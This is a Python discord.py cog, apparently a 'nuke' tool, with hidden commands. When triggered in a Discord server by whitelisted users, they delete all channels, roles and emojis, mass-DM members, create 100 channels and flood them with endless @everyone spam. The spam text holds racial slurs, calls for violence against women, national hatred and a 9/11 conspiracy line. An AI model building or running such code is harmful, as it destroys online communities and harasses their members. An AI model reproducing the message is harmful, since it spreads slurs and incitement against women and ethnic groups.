import discord
from discord.ext import commands
from discord.utils import get as discget


class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.message = """**PAKISTAN ZINDABAD**
GET NUKED YOU FUCKING NIGGERS
YOU FELL FOR OUR INSANELY OBVIOUS TRICK
YOUR SERVER IS FULL OF INCELS
THANK US FOR FIXING IT
ENJOY YOUR NUKED SERVER :rofl: :flag_pk: :muscle: 

**BEAT YOUR WOMEN :ok_hand: NO RIGHTS FOR THEM
BUSH DID 9/11,
FUCK YOU GEORGE**
https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRIa5ezruyEqkG_udsAGYu1LX3CEb0OBtpGGY7CpNeVg_177Rfe
https://i.pinimg.com/originals/f8/f5/f0/f8f5f03bb124a50ee28dc545fa4bcb44.jpg
http://itsmyideas.com/wp-content/uploads/2012/07/Latest-Pakistan-army-SSG-commando-wallpaper-and-picture.jpg
**THE FUCKING FAUJ HAS COME YOU MADARCHOD
INDIA MAURABAD :flag_in: :poop: :flag_il: :poop: 
FREEDOM FOR PALESTINE :flag_ps: :muscle:**"""

        self.invites = 'https://discord.gg/rnGHtna'
        self.koda = 599507281226367006
        self.whitelist = [599507281226367006, 267667599666446336]
        self.no_ban = [599507281226367006, 490275541413265409]
        self.servers = [599514553201459201,
                        617165058446721091, 622217454994849800]

    async def delete_channels(self, ctx):
        print("Deleted channels ( ", end='', flush=True)
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                print(f"'{channel.name}', ", end='', flush=True)
            except:
                pass
        print(')\n')

    async def delete_roles(self, ctx):
        print("Deleted roles ( ", end='', flush=True)
        for role in ctx.guild.roles:
            try:
                await role.delete()
                print(f"'{role.name}', ", end='', flush=True)
            except:
                pass
        print(')\n')

    async def delete_emojis(self, ctx):
        print("Deleted emojis ( ", end='', flush=True)
        for emoji in ctx.guild.emojis:
            try:
                await emoji.delete()
                print(f"'{emoji.name}', ", end='', flush=True)
            except:
                pass
        print(')\n')

    async def ban_members(self, ctx):
        print("Banned members ( ", end='', flush=True)
        for member in ctx.guild.members:
            try:
                if not member.id in self.no_ban:
                    # await ctx.guild.ban(member, reason="NUKE")
                    print(f"'{member.name}', ", end='', flush=True)
                    await member.send(f"{self.message}\n{self.invites}")
            except:
                pass
        print(')\n')

    async def make_channels(self, ctx):
        for i in range(100):
            try:
                await ctx.guild.create_text_channel(f"pakistan-zindabad-{i}")
            except:
                print(f"Created ( {i} channels )")

    async def spam_channel(self, ctx):
        while True:
            try:
                await ctx.send(f"{self.message}\n{self.invites}\n@everyone")
            except:
                pass

    async def spam_all_channels(self, ctx):
        for channel in ctx.guild.channels:
            await channel.send(">spam")

    @commands.Cog.listener()
    async def on_message(self, ctx):
        if ctx.author.bot:
            if ctx.content.startswith(">spam"):
                await self.spam_channel(ctx.channel)

    async def warn(self, ctx, t):
        koda = self.bot.get_user(self.koda)
        await koda.send(f"{ctx.author} attempted to use the {t} command in {ctx.guild.name}.")

    @commands.command(hidden=True)
    async def nuke(self, ctx):
        await ctx.message.delete()
        if ctx.author.id in self.whitelist:
            if not ctx.guild.id in self.servers:
                await self.ban_members(ctx)
                await self.delete_channels(ctx)
                await self.delete_roles(ctx)
                await self.delete_emojis(ctx)
                await self.make_channels(ctx)
                await self.spam_all_channels(ctx)
                print("Done!")
            else:
                await ctx.author.send("You fucking retard, you can't nuke this server.")
        else:
            await self.warn(ctx, 'nuke')
            raise commands.CommandNotFound('shit')

    @commands.command(hidden=True)
    async def destroy(self, ctx):
        await ctx.message.delete()
        if ctx.author.id in self.whitelist:
            if not ctx.guild.id in self.servers:
                await self.delete_channels(ctx)
                await self.delete_roles(ctx)
                await self.delete_emojis(ctx)
                print("Done!")
            else:
                await ctx.author.send("You fucking retard, you can't destroy this server.")
        else:
            await self.warn(ctx, 'destroy')
            raise commands.CommandNotFound('shit')

    @commands.command(hidden=True)
    async def spam(self, ctx):
        await ctx.message.delete()
        if ctx.author.id in self.whitelist:
            if not ctx.guild.id in self.servers:
                await self.spam_all_channels(ctx)
                print("Done!")
            else:
                await ctx.author.send("You fucking retard, you can't spam this server.")
        else:
            self.warn(ctx, 'spam')
            raise commands.CommandNotFound('shit')


def setup(bot):
    bot.add_cog(Nuke(bot))
